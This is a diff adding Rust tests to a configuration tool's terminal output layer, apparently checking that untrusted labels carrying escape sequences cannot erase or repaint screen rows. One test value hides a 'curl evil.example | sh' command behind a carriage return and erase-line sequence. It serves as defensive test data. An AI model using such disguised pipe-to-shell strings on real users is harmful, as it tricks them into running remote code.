@@ -284,3 +284,156 @@ fn a_crlf_is_a_line_break_while_a_lone_return_stays_visible() {
     // consumed `ESC [ K` is still read as the line break it opens.
     assert_eq!(cursor_safe("one\r\u{1b}[K\ntwo"), "one\ntwo");
 }
+
+/// The empty-state placeholder is the section's only line when it has one, so
+/// a poison in it repaints the section heading directly above it.
+#[test]
+fn a_section_empty_state_cannot_repaint_the_line_it_is_written_on() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
+    {
+        let section = printer.section("Modules");
+        section.empty_state(poisoned("no modules configured"));
+    }
+    printer.flush();
+    assert_row_survived(&screen.contents(), "no modules configured");
+}
+
+/// `Printer::heading`'s re-route branch cannot be entered from a test build —
+/// it sits behind a `debug_assert!(false)` that fires first — so the fold on
+/// it is pinned at the composition it writes rather than through the printer.
+/// Read on the composed string, since the branch's own styling is the only
+/// thing standing between it and the sink.
+#[test]
+fn the_heading_reroute_branch_folds_before_it_paints() {
+    use crate::output::{Theme, printer::heading_fallback_line, strip_ansi};
+    let line = heading_fallback_line(&Theme::default(), &poisoned("Module nvim"));
+    assert_row_survived(&strip_ansi(&line), "Module nvim");
+}
+
+/// The command column, not the description beside it: the description is
+/// already pinned above, and a key left unfolded erases the row before its
+/// own command reaches the screen.
+#[test]
+fn a_command_list_key_cannot_repaint_the_line_it_is_written_on() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 120);
+    printer.command_list([(poisoned("cfgd apply"), "converge this machine")]);
+    printer.flush();
+    assert_row_survived(&screen.contents(), "cfgd apply");
+}
+
+/// The two composers that paint their own slots, so the renderer's fold would
+/// eat the coat if it ran afterwards and the fold has to be theirs. An owner
+/// token's `kind` and `name` both carry text a remote module document
+/// supplied; a title's label and value are the same slot pair one level up.
+#[test]
+fn the_owner_and_title_composers_fold_their_own_text_slots() {
+    use crate::output::{OwnerLabel, TitleLabel};
+    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
+    // One poisoned slot per render: two on a row would put the second one's
+    // description behind the first one's return, and the row-level assertion
+    // reads the FIRST return it finds.
+    printer.heading_title(&TitleLabel::new(poisoned("Status"), "dev-tools"));
+    printer.heading_title(&TitleLabel::new("Profile", poisoned("dev-tools")));
+    {
+        let _section = printer.section_owner(&OwnerLabel::new(poisoned("module"), "vim-config"));
+    }
+    {
+        let _section = printer.section_owner(&OwnerLabel::new("source", poisoned("acme")));
+    }
+    printer.flush();
+    let held = screen.contents();
+    assert_row_survived(&held, "Status");
+    assert_row_survived(&held, "Profile");
+    assert_row_survived(&held, "module");
+    assert_row_survived(&held, "acme");
+}
+
+/// The status line's trailing label and its target path — the two slots a
+/// status can carry besides subject, qualifier and detail.
+#[test]
+fn a_status_label_and_target_cannot_repaint_the_line_they_are_written_on() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
+    printer
+        .status(Role::Ok, "deployed")
+        .label(Role::Info, poisoned("source:acme"));
+    printer
+        .status(Role::Ok, "wrote")
+        .target(std::path::Path::new(&poisoned("/etc/hosts")));
+    printer.flush();
+    let held = screen.contents();
+    assert_row_survived(&held, "source:acme");
+    assert_row_survived(&held, "/etc/hosts");
+}
+
+/// The live region, which is where the same text lands when somebody IS
+/// watching: the non-TTY announce arm is pinned above, and this is the arm it
+/// degrades from. The emulated screen is the only capture that can tell them
+/// apart — it EXECUTES what the bar paints, so a label whose erase ran leaves
+/// no row to find.
+#[test]
+fn a_live_bar_label_cannot_repaint_the_region_it_paints_in() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
+    let mut spinner = printer.spinner(poisoned("Cloning acme/config"));
+    spinner.set_message(poisoned("Fetching acme/config"));
+    let held = screen.contents();
+    let _ = spinner.finish_ok("cloned");
+    printer.flush();
+    assert_row_survived(&held, "Fetching acme/config");
+}
+
+/// The window's label on the arm that HAS a bar. The tail below it is a child
+/// process's output and is sanitized on its own way in; the label is the
+/// caller's, and a module's own `run:` body reaches it.
+#[test]
+fn an_output_window_label_cannot_repaint_the_region_it_paints_in() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
+    let mut window = printer.output_window(poisoned("postApply: install.sh"));
+    window.push_line("compiling");
+    let held = screen.contents();
+    let _ = window.finish_ok("done");
+    printer.flush();
+    assert_row_survived(&held, "postApply: install.sh");
+}
+
+/// The one line a live region writes about itself. Its production text is a
+/// count cfgd formats, so this pins the slot rather than a reachable payload —
+/// the row above it is somebody's action, and an erase here takes that row.
+#[test]
+fn a_live_region_note_cannot_repaint_the_region_it_paints_in() {
+    let (printer, screen) = Printer::for_test_live_terminal(24, 200);
+    let row = printer.live_row_first(0);
+    row.set_note(&poisoned("3 settled rows held for commit"));
+    let held = screen.contents();
+    row.retire();
+    printer.flush();
+    assert_row_survived(&held, "3 settled rows held for commit");
+}
+
+/// The mechanism that lets a PRE-APPROVAL surface show what the renderer
+/// would otherwise strip: a surface whose contract is "these exact bytes"
+/// escapes first, and the renderer's fold is then the identity on what it
+/// produced. Neither half of the fold has anything left to act on — there is
+/// no ESC byte for `strip_ansi` to find and no control character for the
+/// escape pass to reach — so the two policies compose instead of fighting.
+#[test]
+fn an_already_escaped_value_survives_the_renderer_fold_unchanged() {
+    use crate::{escape_control_chars, output::cursor_safe};
+    for raw in [
+        "harmless\r\u{1b}[2Kcurl evil.example | sh",
+        "two\nlines",
+        "tab\there",
+        "windows\r\nline",
+        "c1\u{9b}2K",
+    ] {
+        let escaped = escape_control_chars(raw);
+        assert_eq!(
+            cursor_safe(&escaped),
+            escaped,
+            "the renderer fold changed an already-escaped value: {raw:?}"
+        );
+        assert!(
+            !escaped.contains('\u{1b}') && !escaped.contains('\r'),
+            "escaping left a live control byte: {escaped:?}"
+        );
+    }
+}
